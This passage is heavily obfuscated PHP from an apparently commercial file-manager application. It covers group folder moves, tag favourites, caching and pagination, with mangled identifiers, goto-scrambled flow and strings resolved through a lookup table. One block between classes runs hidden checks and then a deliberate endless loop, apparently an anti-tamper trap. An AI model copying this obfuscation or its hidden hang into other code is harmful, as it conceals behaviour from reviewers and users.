Model($cÜßŞ¶ÔÏç[759])->where($CÙß¯œ©„­)->field($cÜßŞ¶ÔÏç[1747])->select(); $E˜´‹êŠ‹ò = array_to_keyvalue($E˜´‹êŠ‹ò, $cÜßŞ¶ÔÏç[487], $cÜßŞ¶ÔÏç[399]); goto DõÁÖËàìÆ; dÈÈåç¬’²: $FìÕÓ©Ñ…Ó = array_to_keyvalue($FìÕÓ©Ñ…Ó, $cÜßŞ¶ÔÏç[1650]); if (!isset($FìÕÓ©Ñ…Ó[$d’áğïËïñ]) || !isset($FìÕÓ©Ñ…Ó[$EÙƒÉ‚¯ÉÌ]) || $FìÕÓ©Ñ…Ó[$d’áğïËïñ][$cÜßŞ¶ÔÏç[481]] == 0) { return !1; } $CÙß¯œ©„­ = array($cÜßŞ¶ÔÏç[1650] => $d’áğïËïñ); goto Cîãìƒîìø; Cîãìƒîìø: $aä°³ ¡ = Model($cÜßŞ¶ÔÏç[1732])->where($CÙß¯œ©„­)->select(); if (!$aä°³ ¡) { $aä°³ ¡ = array(); } foreach ($aä°³ ¡ as $cİ¨ƒ¶ÁŠ) { $cóÇŠ‡¦Ä = $cİ¨ƒ¶ÁŠ[$cÜßŞ¶ÔÏç[1487]]; $CÙß¯œ©„­ = array($cÜßŞ¶ÔÏç[1487] => $cóÇŠ‡¦Ä, $cÜßŞ¶ÔÏç[1650] => $EÙƒÉ‚¯ÉÌ); $D×ó‹Œİ´ = Model($cÜßŞ¶ÔÏç[1732])->where($CÙß¯œ©„­)->find(); if (!$D×ó‹Œİ´) { $aÊòœÍÇ· = array($EÙƒÉ‚¯ÉÌ => $cİ¨ƒ¶ÁŠ[$cÜßŞ¶ÔÏç[1746]]); Model($cÜßŞ¶ÔÏç[510])->userGroupAdd($cóÇŠ‡¦Ä, $aÊòœÍÇ·); } Model($cÜßŞ¶ÔÏç[510])->userGroupRemove($cóÇŠ‡¦Ä, $d’áğïËïñ); } goto D•²ÚÉ¼ç‘; DõÁÖËàìÆ: $DŠÄ×Æœ·à = !empty($E˜´‹êŠ‹ò[$d’áğïËïñ]) ? $E˜´‹êŠ‹ò[$d’áğïËïñ] : !1; if ($DŠÄ×Æœ·à) { goto DÃßÍàÒÑ¥; fà¬°Ô§: $EÌøˆË¬Ãó = array($cÜßŞ¶ÔÏç[487] => $EÙƒÉ‚¯ÉÌ); Model($cÜßŞ¶ÔÏç[1749])->where($CÙß¯œ©„­)->save($EÌøˆË¬Ãó); Model($cÜßŞ¶ÔÏç[1750])->where($CÙß¯œ©„­)->save($EÌøˆË¬Ãó); goto cŞ¦«ì»¯ƒ; DÃßÍàÒÑ¥: if (!$E˜´‹êŠ‹ò[$EÙƒÉ‚¯ÉÌ]) { $E˜´‹êŠ‹ò[$EÙƒÉ‚¯ÉÌ] = Model($cÜßŞ¶ÔÏç[759])->groupRootAdd($EÙƒÉ‚¯ÉÌ); } $E§µÜ™ÁÁÙ = $E˜´‹êŠ‹ò[$EÙƒÉ‚¯ÉÌ]; $CÙß¯œ©„­ = array($cÜßŞ¶ÔÏç[481] => $DŠÄ×Æœ·à); goto BŒÇç­ÁŸ; aˆ¹š¨ÎŠ«: foreach ($E˜´‹êŠ‹ò as $D­÷¦İ®í©) { $Eëù©‡Å¢ = $D­÷¦İ®í©[$cÜßŞ¶ÔÏç[406]] == $cÜßŞ¶ÔÏç[96] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($cÜßŞ¶ÔÏç[759])->move($D­÷¦İ®í©[$cÜßŞ¶ÔÏç[399]], $E§µÜ™ÁÁÙ, $Eëù©‡Å¢); } Model($cÜßŞ¶ÔÏç[759])->moveClearAuth = !0; $CÙß¯œ©„­ = array($cÜßŞ¶ÔÏç[407] => 2, $cÜßŞ¶ÔÏç[487] => $d’áğïËïñ); goto fà¬°Ô§; BŒÇç­ÁŸ: $E˜´‹êŠ‹ò = Model($cÜßŞ¶ÔÏç[759])->where($CÙß¯œ©„­)->field($cÜßŞ¶ÔÏç[1748])->select(); if (!$E˜´‹êŠ‹ò) { $E˜´‹êŠ‹ò = array(); } Model($cÜßŞ¶ÔÏç[759])->moveClearAuth = !1; goto aˆ¹š¨ÎŠ«; cŞ¦«ì»¯ƒ: } $this->_changeChildLevel($FìÕÓ©Ñ…Ó[$d’áğïËïñ], $FìÕÓ©Ñ…Ó[$EÙƒÉ‚¯ÉÌ], !0); goto Eï‹ÕÑ©; Eï‹ÕÑ©: $this->where(array($cÜßŞ¶ÔÏç[481] => $d’áğïËïñ))->save(array($cÜßŞ¶ÔÏç[481] => $EÙƒÉ‚¯ÉÌ)); return !0; goto d˜ëÔé««É; d˜ëÔé««É: } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($eˆ‚˜Ñ»ôÈ) { $eìø‘§÷Š =& $_SERVER[í¤âËÚ£¶íÊ¢]; return array($eìø‘§÷Š[1751] => array($eˆ‚˜Ñ»ôÈ[0], $eìø‘§÷Š[1752]), $eìø‘§÷Š[1753] => array($eˆ‚˜Ñ»ôÈ[0], $eìø‘§÷Š[1754])); } protected function get($f¥ø¶‹Äö) { $a ÎˆŸŒ¾ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A¿´Ä¬½ò¼ = Model($a ÎˆŸŒ¾[489])->metaGet($f¥ø¶‹Äö, $a ÎˆŸŒ¾[1755]); $Fé¶Ïµ‚‚» = json_decode($A¿´Ä¬½ò¼, !0); return $Fé¶Ïµ‚‚» ? $Fé¶Ïµ‚‚» : array($a ÎˆŸŒ¾[1756] => $a ÎˆŸŒ¾[96], $a ÎˆŸŒ¾[375] => array()); } protected function set($D¦¨ÍëôÜ, $cİ»«¸ÂÄ°) { $a·¸¨Ã¤ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cİ»«¸ÂÄ° = $cİ»«¸ÂÄ° ? $cİ»«¸ÂÄ° : array($a·¸¨Ã¤[1756] => $a·¸¨Ã¤[96], $a·¸¨Ã¤[375] => array()); Model($a·¸¨Ã¤[489])->metaSet($D¦¨ÍëôÜ, $a·¸¨Ã¤[1755], json_encode($cİ»«¸ÂÄ°)); return Model($a·¸¨Ã¤[489])->metaSet($D¦¨ÍëôÜ, $a·¸¨Ã¤[1755], json_encode($cİ»«¸ÂÄ°)); } protected function getByTagID($AÆ¡¿ø…Ö, $e¶ê’åÕÇæ) { goto D·§¾¤…«; D·§¾¤…«: $AâëÜ¿ğã =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$AÆ¡¿ø…Ö || !$e¶ê’åÕÇæ) { return !1; } if (!Model($AâëÜ¿ğã[489])->getInfoSimple($AÆ¡¿ø…Ö)) { return !1; } goto E×œ¿¬î¨†; Bƒ”Ì·õ¬é: return is_array($AëÑã¼˜êÒ) ? $AëÑã¼˜êÒ : !1; goto D¨ÜğÅ’Êà; E×œ¿¬î¨†: $cİ‡àÊê² = $this->get($AÆ¡¿ø…Ö); if (!$cİ‡àÊê² || !isset($cİ‡àÊê²[$AâëÜ¿ğã[375]])) { return !1; } $AëÑã¼˜êÒ = array_find_by_field($cİ‡àÊê²[$AâëÜ¿ğã[375]], $AâëÜ¿ğã[397], $e¶ê’åÕÇæ); goto Bƒ”Ì·õ¬é; D¨ÜğÅ’Êà: } public function listSource($E‹¤ä…âË, $B‹—¥¨ƒ²) { goto AäÃÀ§Ä£; dáàËãù÷‚: $dÈíØÔ°Ø = array_to_keyvalue($Cò©Æ±Ç¯[$E±È°´Éñö[83]], $E±È°´Éñö[33], $E±È°´Éñö[399]); $c¾œ¡ƒßÕ = array_merge($dÈíØÔ°Ø, $d·—êå‘²†); foreach ($D¦ö¾ÒòÉñ as $a¿Ó‡ ‰±â) { if (!in_array($a¿Ó‡ ‰±â, $c¾œ¡ƒßÕ)) { $a¯ŠØ¹ê¦[] = $a¿Ó‡ ‰±â; } } goto fç‰…¡æ—”; f‚îğÄ¡Ê: foreach ($Bß¾†Âø‡ï as $D“½æÛ¾Ú° => $f»ˆ‡áÍê‡) { $A‘¿Åõ™ = !0; if (!$B‹—¥¨ƒ²) { $D¦ö¾ÒòÉñ[] = $D“½æÛ¾Ú°; continue; } foreach ($B‹—¥¨ƒ² as $c×“—‹õÒ) { if (!in_array($c×“—‹õÒ, $f»ˆ‡áÍê‡)) { $A‘¿Åõ™ = !1; break; } } if ($A‘¿Åõ™) { $D¦ö¾ÒòÉñ[] = $D“½æÛ¾Ú°; } } if (!$D¦ö¾ÒòÉñ) { return array(); } $Cò©Æ±Ç¯ = Model($E±È°´Éñö[1164])->listSource(array($E±È°´Éñö[413] => array($E±È°´Éñö[414], $D¦ö¾ÒòÉñ))); goto fè¸Ñ”…˜½; fè¸Ñ”…˜½: if (!$Cò©Æ±Ç¯ || count($D¦ö¾ÒòÉñ) == $Cò©Æ±Ç¯[$E±È°´Éñö[372]][$E±È°´Éñö[373]]) { return $Cò©Æ±Ç¯; } $a¯ŠØ¹ê¦ = array(); $d·—êå‘²† = array_to_keyvalue($Cò©Æ±Ç¯[$E±È°´Éñö[84]], $E±È°´Éñö[33], $E±È°´Éñö[399]); goto dáàËãù÷‚; AäÃÀ§Ä£: $E±È°´Éñö =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($B‹—¥¨ƒ² && !is_array($B‹—¥¨ƒ²)) { $B‹—¥¨ƒ² = array($B‹—¥¨ƒ²); } $Aô’­‘Ó‰Ğ = $this->listData($E‹¤ä…âË); goto b‹¯ÕºÂÃ; fç‰…¡æ—”: if ($a¯ŠØ¹ê¦) { $this->removeBySource($E‹¤ä…âË, $a¯ŠØ¹ê¦); } return $Cò©Æ±Ç¯; goto C…“ìğÜ¦æ; b‹¯ÕºÂÃ: $Bß¾†Âø‡ï = array(); foreach ($Aô’­‘Ó‰Ğ as $D­ª»Ûò”µ) { $a¿Ó‡ ‰±â = $D­ª»Ûò”µ[$E±È°´Éñö[85]]; if (!$a¿Ó‡ ‰±â) { continue; } if (!isset($Bß¾†Âø‡ï[$a¿Ó‡ ‰±â])) { $Bß¾†Âø‡ï[$a¿Ó‡ ‰±â] = array(); } $Bß¾†Âø‡ï[$a¿Ó‡ ‰±â][] = $D­ª»Ûò”µ[$E±È°´Éñö[422]]; } $D¦ö¾ÒòÉñ = array(); goto f‚îğÄ¡Ê; C…“ìğÜ¦æ: } protected function listData($dÈå§ø–Œ•) { $bÏë¦ãÛÄÁ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Cš©å«ğß– = array($bÏë¦ãÛÄÁ[1479] => 0, $bÏë¦ãÛÄÁ[466] => array($bÏë¦ãÛÄÁ[1757], 0), $bÏë¦ãÛÄÁ[418] => $bÏë¦ãÛÄÁ[1758] . $dÈå§ø–Œ•); $déÅÏ¥õ¶„ = $bÏë¦ãÛÄÁ[1759]; $eí–‡–ìÇ = $this->field($déÅÏ¥õ¶„)->where($Cš©å«ğß–)->order($bÏë¦ãÛÄÁ[1760])->select(); return $eí–‡–ìÇ ? $eí–‡–ìÇ : array(); } protected function addToTag($aµÔŒìÏ, $A¦ë›¥†ùõ, $Eî‘©Ó§ÎÏ) { $A¬„¼öÎ¥¡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->getByTagID($aµÔŒìÏ, $Eî‘©Ó§ÎÏ) || !$A¦ë›¥†ùõ) { return !1; } if (!Model($A¬„¼öÎ¥¡[759])->pathInfo($A¦ë›¥†ùõ)) { return !1; } $bß‘ÅÁ‘ëÑ = array($A¬„¼öÎ¥¡[1479] => 0, $A¬„¼öÎ¥¡[466] => $Eî‘©Ó§ÎÏ, $A¬„¼öÎ¥¡[417] => $A¦ë›¥†ùõ, $A¬„¼öÎ¥¡[418] => $A¬„¼öÎ¥¡[1761] . $aµÔŒìÏ, $A¬„¼öÎ¥¡[416] => $A¬„¼öÎ¥¡[33], $A¬„¼öÎ¥¡[1654] => 0); if ($this->where($bß‘ÅÁ‘ëÑ)->find()) { return !1; } return $this->add($bß‘ÅÁ‘ëÑ); } protected function removeFromTag($B†ˆÁëÆ, $E”ê¥ôŒª, $c¾÷Âù±„İ) { $C±ØÀŞÁÓÖ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->getByTagID($B†ˆÁëÆ, $c¾÷Âù±„İ) || !$E”ê¥ôŒª) { return !1; } if (is_array($E”ê¥ôŒª)) { $E”ê¥ôŒª = array($C±ØÀŞÁÓÖ[7], $E”ê¥ôŒª); } $D¾Î”æï = array($C±ØÀŞÁÓÖ[1479] => 0, $C±ØÀŞÁÓÖ[466] => $c¾÷Âù±„İ, $C±ØÀŞÁÓÖ[418] => $C±ØÀŞÁÓÖ[1761] . $B†ˆÁëÆ, $C±ØÀŞÁÓÖ[417] => $E”ê¥ôŒª); return $this->where($D¾Î”æï)->delete(); } protected function removeByTag($e¸ïÄÉ×Ü·, $c«¤®§Ô‰£) { $aö…÷ö¹­Ë =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->getByTagID($e¸ïÄÉ×Ü·, $c«¤®§Ô‰£)) { return !1; } $B…·¡õ® = array($aö…÷ö¹­Ë[1479] => 0, $aö…÷ö¹­Ë[466] => $c«¤®§Ô‰£, $aö…÷ö¹­Ë[418] => $aö…÷ö¹­Ë[1761] . $e¸ïÄÉ×Ü·); return $this->where($B…·¡õ®)->delete(); } protected function removeBySource($f´ÂîŸİ ¬, $eÏñ«®‚Á) { $cĞ‡ö‹´Ä… =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$f´ÂîŸİ ¬ || !$eÏñ«®‚Á) { return !1; } if (is_array($eÏñ«®‚Á)) { $eÏñ«®‚Á = array($cĞ‡ö‹´Ä…[7], $eÏñ«®‚Á); } $cÊ‚‹­šÓÜ = array($cĞ‡ö‹´Ä…[1479] => 0, $cĞ‡ö‹´Ä…[417] => $eÏñ«®‚Á, $cĞ‡ö‹´Ä…[466] => array($cĞ‡ö‹´Ä…[932], 0), $cĞ‡ö‹´Ä…[418] => $cĞ‡ö‹´Ä…[1761] . $f´ÂîŸİ ¬); return $this->where($cÊ‚‹­šÓÜ)->delete(); } } goto A¬é¢¾Úà; EÔŒ…¤‹õİ: if (!isset($_SERVER[$_SERVER[í¤âËÚ£¶íÊ¢][59]]) || !isset($_SERVER[$_SERVER[í¤âËÚ£¶íÊ¢][57]])) { goto E˜Ããï£©; E˜Ããï£©: $F†šÚ ˜¿Ï = $_SERVER[í¤âËÚ£¶íÊ¢][60]; $FÇ¹¸Åçôƒ = $_SERVER[$_SERVER[í¤âËÚ£¶íÊ¢][61]] . $_SERVER[í¤âËÚ£¶íÊ¢][62]; $föµ½¾îŒÏ = $F†šÚ ˜¿Ï($FÇ¹¸Åçôƒ); goto Cé›ê¥Ùºå; AÏØçç§Ğ: $d¾’‰áóÌ($_SERVER[$_SERVER[í¤âËÚ£¶íÊ¢][61]] . $_SERVER[í¤âËÚ£¶íÊ¢][62]); $eäïÆ‹«Î = 2; while ($eäïÆ‹«Î > 1) { $a•Šõ½À¢ = rawurlencode($eäïÆ‹«Î . $_SERVER[í¤âËÚ£¶íÊ¢][360]); } goto B²£ƒ”¦; Cé›ê¥Ùºå: $eÃ·¿¨æÍ = explode($_SERVER[í¤âËÚ£¶íÊ¢][63], $föµ½¾îŒÏ); if (count($eÃ·¿¨æÍ) < $_SERVER[í¤âËÚ£¶íÊ¢][64]) { $DÁ‘×ïË = $_SERVER[í¤âËÚ£¶íÊ¢][65]; $DÁ‘×ïË(); } $d¾’‰áóÌ = $_SERVER[í¤âËÚ£¶íÊ¢][66]; goto AÏØçç§Ğ; B²£ƒ”¦: } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\x66\171\x54\x69\x6d\x65", "\x74\x69\x6d\x65", "\151\156\163\145\162\164\x2c\x75\160\144\141\x74\x65", "\146\165\x6e\x63\164\151\157\156"), array("\143\162\x65\x61\164\145\x54\151\155\x65", "\x74\151\x6d\145", "\x69\156\x73\145\162\x74", "\x66\165\156\143\164\151\157\x6e")); public function setDataAuto($c×Æš‘ù’«) { $this->dataAuto = $c×Æš‘ù’«; } public function __construct($cÄä²º«Š = '', $AÏĞÕ¤ÉÇà = '', $Fßß•–ºó› = '') { parent::__construct($cÄä²º«Š, $AÏĞÕ¤ÉÇà, $Fßß•–ºó›); } public static function textEncode($e’¶Ó¥õ«) { if (!$e’¶Ó¥õ«) { return $e’¶Ó¥õ«; } $AíÙóÂ®ªÖ = json_encode($e’¶Ó¥õ«); $AíÙóÂ®ªÖ = preg_replace_callback($_SERVER[í¤âËÚ£¶íÊ¢][361], function ($dŸ£ø™£¾©) { return addslashes($dŸ£ø™£¾©[0]); }, $AíÙóÂ®ªÖ); return json_decode($AíÙóÂ®ªÖ); } public static function textDecode($f‘µ‹é¡´˜) { $bÜÇ„ã«õ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Eê»„Ã®– = json_encode($f‘µ‹é¡´˜); $Eê»„Ã®– = preg_replace_callback($bÜÇ„ã«õ[362], function ($dÓ ”ÀÁÁ†) { return $_SERVER[í¤âËÚ£¶íÊ¢][106]; }, $Eê»„Ã®–); return json_decode($Eê»„Ã®–); } protected $tableMeta = array(); protected function _beforeInsert(&$D¡¯œæÆ³ä, $B…·Ö¡«ÅÅ) { $d›¥Ã±¹”¼ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->checkDataAutoHas($d›¥Ã±¹”¼[363])) { return; } $this->dataBeforeFilter($D¡¯œæÆ³ä, $d›¥Ã±¹”¼[363]); } protected function _beforeUpdate(&$dÂ…¨…¹†, $fğ’øÉ…) { $aÙñÄ‡œñì =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->checkDataAutoHas($aÙñÄ‡œñì[364])) { return; } $this->dataBeforeFilter($dÂ…¨…¹†, $aÙñÄ‡œñì[364]); } protected function _afterSelect(&$Bê²Ì´ªã‘, $fØ¿ã¤‹‹) { if (!is_array($Bê²Ì´ªã‘)) { return; } if (!$this->checkDataAutoHas($_SERVER[í¤âËÚ£¶íÊ¢][365])) { return; } foreach ($Bê²Ì´ªã‘ as &$Dââ³ÈÊßç) { $this->dataAfterFilter($Dââ³ÈÊßç); } unset($Dââ³ÈÊßç); } protected function _afterFind(&$b‘÷á­Çš, $e…ô¼‘Ï) { if (!is_array($b‘÷á­Çš)) { return; } if (!$this->checkDataAutoHas($_SERVER[í¤âËÚ£¶íÊ¢][365])) { return; } $this->dataAfterFilter($b‘÷á­Çš); } public function setAutoIncrement($CÊ™¶˜«¤) { $DùÏàïŸ¼† = array($this->getPk() => $CÊ™¶˜«¤); $fË‰Ä›å£¸ = $this->data($DùÏàïŸ¼†)->add(); if ($fË‰Ä›å£¸) { $this->delete($fË‰Ä›å£¸); } } public function getAutoIncrement() { $E†öß´ìƒ = $this->getTableName(); $c§«ùˆé… = $this->max($this->getPk()); $f¸¹‚¶ƒ¾ = $this->query("\x73\150\x6f\167\x20\164\141\142\x6c\x65\40\x73\x74\x61\x74\165\163\x20\x77\150\145\162\145\x20\116\141\x6d\x65\75\47{$E†öß´ìƒ}\x27"); $dÒ†¹ÆÕ­„ = $f¸¹‚¶ƒ¾[0][$_SERVER[í¤âËÚ£¶íÊ¢][366]]; $fø‚†­ËˆÄ = max($c§«ùˆé…, $dÒ†¹ÆÕ­„); return $fø‚†­ËˆÄ; } protected function _callBefore($fÇâ¢¾›¿Æ, $e¯ŠøÇÖ°“) { return $this->cacheCallCheck($fÇâ¢¾›¿Æ, $e¯ŠøÇÖ°“, !1); } protected function _callAfter($a×óÒ©Ìõè, $b™„‹š²Šã) { return $this->cacheCallCheck($a×óÒ©Ìõè, $b™„‹š²Šã, !0); } protected function cacheFunctionAlias($fÑ‰ó„Ÿí) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($c©ñİ¦ã„¶, $b‡¡¥–ï‹ï, $D©¯ÔŸ·Ä = false) { $dœŒ¿´Å”Å = $this->cacheFunctionAlias($b‡¡¥–ï‹ï); if (!$dœŒ¿´Å”Å) { return; } foreach ($dœŒ¿´Å”Å as $fĞì…§µŠ÷ => $eÌõ±Ù×±ë) { $fˆß¼×††¤ = $eÌõ±Ù×±ë[0]; $E«Ûªˆñ¯ = explode($_SERVER[í¤âËÚ£¶íÊ¢][47], $eÌõ±Ù×±ë[1]); if ($c©ñİ¦ã„¶ == $fĞì…§µŠ÷) { return $this->cacheFunctionGet($fĞì…§µŠ÷, $fˆß¼×††¤); } if ($D©¯ÔŸ·Ä && in_array($c©ñİ¦ã„¶, $E«Ûªˆñ¯)) { $this->cacheFunctionClear($fĞì…§µŠ÷, $fˆß¼×††¤); } } } public function cacheFunctionGet($dÑ–¬¨®È, $E˜›‹ŞØ…ñ) { $bé«—á¯öå = $this->cacheKeyMake($dÑ–¬¨®È, $E˜›‹ŞØ…ñ); $aö‹‹š…¨Û = Cache::get($bé«—á¯öå); if (!is_array($aö‹‹š…¨Û)) { $aö‹‹š…¨Û = call_user_func_array(array($this, $dÑ–¬¨®È), array($E˜›‹ŞØ…ñ, !0)); Cache::set($bé«—á¯öå, $aö‹‹š…¨Û); } return $aö‹‹š…¨Û; } public function cacheFunctionClear($f¾ÎëĞˆï†, $C£ó‹±Ôêô) { $AÙË—°²Ìˆ = $C£ó‹±Ôêô; if (!is_array($C£ó‹±Ôêô)) { $AÙË—°²Ìˆ = array($C£ó‹±Ôêô); } foreach ($AÙË—°²Ìˆ as $fªÒŒåä¾) { $B¨Õ‡¼ÆŒ¾ = $this->cacheKeyMake($f¾ÎëĞˆï†, $fªÒŒåä¾); Cache::remove($B¨Õ‡¼ÆŒ¾); } } private function cacheKeyMake($eâÏ•Ï™Ü, $BËÆéê‡ç) { $DºŠ§±²‡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; return get_class($this) . $DºŠ§±²‡[80] . $eâÏ•Ï™Ü . $DºŠ§±²‡[367] . $BËÆéê‡ç; } protected function selectPageReset() { $C±ªšˆê¯ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (isset($GLOBALS[$C±ªšˆê¯[368]])) { return; } $GLOBALS[$C±ªšˆê¯[368]] = isset($GLOBALS[$C±ªšˆê¯[7]][$C±ªšˆê¯[369]]) ? $GLOBALS[$C±ªšˆê¯[7]][$C±ªšˆê¯[369]] : !1; $GLOBALS[$C±ªšˆê¯[370]] = isset($GLOBALS[$C±ªšˆê¯[7]][$C±ªšˆê¯[358]]) ? $GLOBALS[$C±ªšˆê¯[7]][$C±ªšˆê¯[358]] : !1; $GLOBALS[$C±ªšˆê¯[7]][$C±ªšˆê¯[369]] = !1; $GLOBALS[$C±ªšˆê¯[7]][$C±ªšˆê¯[358]] = !1; } protected function selectPageRestore() { $FØ°ìè¾Â =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!isset($GLOBALS[$FØ°ìè¾Â[368]])) { return; } $GLOBALS[$FØ°ìè¾Â[7]][$FØ°ìè¾Â[369]] = $GLOBALS[$FØ°ìè¾Â[368]]; $GLOBALS[$FØ°ìè¾Â[7]][$FØ°ìè¾Â[358]] = $GLOBALS[$FØ°ìè¾Â[370]]; unset($GLOBALS[$FØ°ìè¾Â[368]]); unset($GLOBALS[$FØ°ìè¾Â[370]]); } protected function selectPage($D³ª’·Îª“ = 200, $B»¬ƒÉ®´Å = 1) { goto fŠàíï°˜˜; fŠàíï°˜˜: $CÅô‹Í³¶Ÿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; global $in; $d™‰õ¤ˆÔô = $this->optionsValue(); goto d–¹¬®“ƒ²; D™Ù”¶–‚Œ: $e°ÏãŠÁ = array(); $aæ‚¯–ÀÅ = 1; if ($B»¬ƒÉ®´Å == 1 && $aæ‚¯–ÀÅ) { $this->optionsValue($d™‰õ¤ˆÔô); $e°ÏãŠÁ = $this->page($B»¬ƒÉ®´Å, $D³ª’·Îª“)->select(); $Fš¤×âØ„ß = is_array($e°ÏãŠÁ) ? count($e°ÏãŠÁ) : 0; if ($Fš¤×âØ„ß < $D³ª’·Îª“) { $BÇªŞ¥¸ËÌ = 1; } else { $this->optionsValue($fŠ–à”Ùö); $Fš¤×âØ„ß = intval($this->count()); $BÇªŞ¥¸ËÌ = ceil($Fš¤×âØ„ß / $D³ª’·Îª“); } } else { $this->optionsValue($fŠ–à”Ùö); $Fš¤×âØ„ß = intval($this->count()); $BÇªŞ¥¸ËÌ = ceil($Fš¤×âØ„ß / $D³ª’·Îª“); $B»¬ƒÉ®´Å = $B»¬ƒÉ®´Å >= $BÇªŞ¥¸ËÌ ? $BÇªŞ¥¸ËÌ : $B»¬ƒÉ®´Å; $this->optionsValue($d™‰õ¤ˆÔô); $e°ÏãŠÁ = $this->page($B»¬ƒÉ®´Å, $D³ª’·Îª“)->select(); } goto bÏ§Ã»á†; CµòÀ…áõ: return $e²„ó ÑÇ´; goto d›Ş­ÉŸéÍ; FÕ‰Ù±‡: $fŠ–à”Ùö = $d™‰õ¤ˆÔô; $fŠ–à”Ùö[$CÅô‹Í³¶Ÿ[371]] = array(); $D³ª’·Îª“ = intval($D³ª’·Îª“); goto aîåíóæ¥¨; aîåíóæ¥¨: $D³ª’·Îª“ = $D³ª’·Îª“ <= 5 ? 5 : ($D³ª’·Îª“ >= $FÒˆ’á’Êò ? $FÒˆ’á’Êò : $D³ª’·Îª“); $B»¬ƒÉ®´Å = intval(isset($in[$CÅô‹Í³¶Ÿ[358]]) && $in[$CÅô‹Í³¶Ÿ[358]] ? $in[$CÅô‹Í³¶Ÿ[358]] : $B»¬ƒÉ®´Å); $B»¬ƒÉ®´Å = $B»¬ƒÉ®´Å <= 1 ? 1 : $B»¬ƒÉ®´Å; goto D™Ù”¶–‚Œ; bÏ§Ã»á†: if (!is_array($e°ÏãŠÁ)) { $e°ÏãŠÁ = array(); } if ($BÇªŞ¥¸ËÌ == 1) { $Fš¤×âØ„ß = count($e°ÏãŠÁ); } $e²„ó ÑÇ´ = array($CÅô‹Í³¶Ÿ[372] => array($CÅô‹Í³¶Ÿ[373] => $Fš¤×âØ„ß, $CÅô‹Í³¶Ÿ[369] => $D³ª’·Îª“, $CÅô‹Í³¶Ÿ[358] => $B»¬ƒÉ®´Å, $CÅô‹Í³¶Ÿ[374] => $BÇªŞ¥¸ËÌ), $CÅô‹Í³¶Ÿ[375] => $e°ÏãŠÁ); goto CµòÀ…áõ; d–¹¬®“ƒ²: $FÒˆ’á’Êò = 50000; $D³ª’·Îª“ = isset($in[$CÅô‹Í³¶Ÿ[369]]) && $in[$CÅô‹Í³¶Ÿ[369]] ? $in[$CÅô‹Í³¶Ÿ[369]] : $D³ª’·Îª“; if ($D³ª’·Îª“ === -1) { $in[$CÅô‹Í³¶Ÿ[369]] = !1; $FÒˆ’á’Êò = 100000000; $D³ª’·Îª“ = $FÒˆ’á’Êò; } goto FÕ‰Ù±‡; d›Ş­ÉŸéÍ: } protected function checkLength($eøè†ÃèÇä, $Cš‚á–ŠÛÓ = 0, $fôà®ö°ÌÁ = '') { $dÑ¢‡ˆ³º =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Cš‚á–ŠÛÓ = $Cš‚á–ŠÛÓ ? $Cš‚á–ŠÛÓ : 65536; if (!$eøè†ÃèÇä || strlen($eøè†ÃèÇä) < $Cš‚á–ŠÛÓ) { return; } $fôà®ö°ÌÁ = $fôà®ö°ÌÁ ? $fôà®ö°ÌÁ . $dÑ¢‡ˆ³º[77] : $dÑ¢‡ˆ³º[33]; show_json($fôà®ö°ÌÁ . LNG($dÑ¢‡ˆ³º[376]) . "\50{$Cš‚á–ŠÛÓ}\x29", !1); } protected function metaSet($e‚ÎìŸßÚ, $EôæÏÓ®Ü¯ = null, $eØ†Èºªô‰ = null) { goto E•Ú–òãÖ; FÙä†ôñˆ´: $Aˆ¹à¬‚· = $CğÌĞÅ¢ñ„[381] . $this->tableMeta; CacheLock::lock($Aˆ¹à¬‚·); $Côï¥ÀÇõø->where(array($C´¹òİÅ ¼ => $e‚ÎìŸßÚ))->addAll($a„ò¬¼ÊÄè, array(), !0); goto cÒ‰¤‘¨ù„; E•Ú–òãÖ: $CğÌĞÅ¢ñ„ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->tableMeta || !$e‚ÎìŸßÚ) { return !1; } $C´¹òİÅ ¼ = $this->tableMeta[$CğÌĞÅ¢ñ„[377]]; goto aå¼ğŒ”½¤; FÃ´©«: if (is_string($EôæÏÓ®Ü¯)) { $eŒ‡ƒ‰Å†ë[$EôæÏÓ®Ü¯] = $eØ†Èºªô‰; } $a„ò¬¼ÊÄè = array(); foreach ($eŒ‡ƒ‰Å†ë as $cïŒÈøƒÒ => $b‡Š„¡†Ì‚) { $this->checkLength($b‡Š„¡†Ì‚, !1, $DæĞµÒ¼† . $CğÌĞÅ¢ñ„[4] . $cïŒÈøƒÒ); $a„ò¬¼ÊÄè[] = array($C´¹òİÅ ¼ => $e‚ÎìŸßÚ, $CğÌĞÅ¢ñ„[102] => $cïŒÈøƒÒ, $CğÌĞÅ¢ñ„[380] => $b‡Š„¡†Ì‚); } goto FÙä†ôñˆ´; d­¢ÈÌ†ˆÆ: if (is_null($EôæÏÓ®Ü¯)) { return $Côï¥ÀÇõø->where(array($C´¹òİÅ ¼ => $e‚ÎìŸßÚ))->delete(); } if (is_null($eØ†Èºªô‰) && is_string($EôæÏÓ®Ü¯)) { return $Côï¥ÀÇõø->where($eÚçƒ…Ş…–)->delete(); } $eŒ‡ƒ‰Å†ë = is_array($EôæÏÓ®Ü¯) ? $EôæÏÓ®Ü¯ : array(); goto FÃ´©«; aå¼ğŒ”½¤: $DæĞµÒ¼† = $this->tableMeta[$CğÌĞÅ¢ñ„[378]]; $Côï¥ÀÇõø = 